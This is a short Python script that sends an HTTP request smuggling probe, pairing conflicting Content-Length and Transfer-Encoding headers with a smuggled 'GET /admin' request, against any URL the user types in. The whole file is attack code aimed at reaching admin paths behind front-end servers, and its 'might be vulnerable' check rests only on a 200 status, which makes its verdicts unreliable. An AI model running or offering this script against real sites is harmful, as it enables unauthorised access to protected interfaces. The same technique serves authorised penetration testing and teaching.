import requests

def smuggle_request(target_url):
    headers = {
        "Host": target_url.replace("http://", "").replace("https://", ""),
        "Content-Length": "13",
        "Transfer-Encoding": "chunked"
    }

    payload = (
        "0\r\n"  # End of chunked message
        "\r\n"   # New request starts here
        "GET /admin HTTP/1.1\r\n"
        "Host: {}\r\n"
        "Connection: keep-alive\r\n\r\n"
    ).format(headers["Host"])

    print(f"🚀 Sending Smuggling Test to {target_url}...\n")
    
    try:
        response = requests.post(target_url, headers=headers, data=payload, timeout=5)

        if response.status_code == 200:
            print("✅ Target might be vulnerable!")
            print("📜 Response:\n", response.text[:500])  # Print first 500 characters
        else:
            print("❌ Target does not seem vulnerable.")
    
    except requests.exceptions.RequestException as e:
        print(f"⚠️ Request failed: {e}")

if __name__ == "__main__":
    target_url = input("🔗 Enter target URL (e.g., http://example.com): ").strip()
    smuggle_request(target_url)
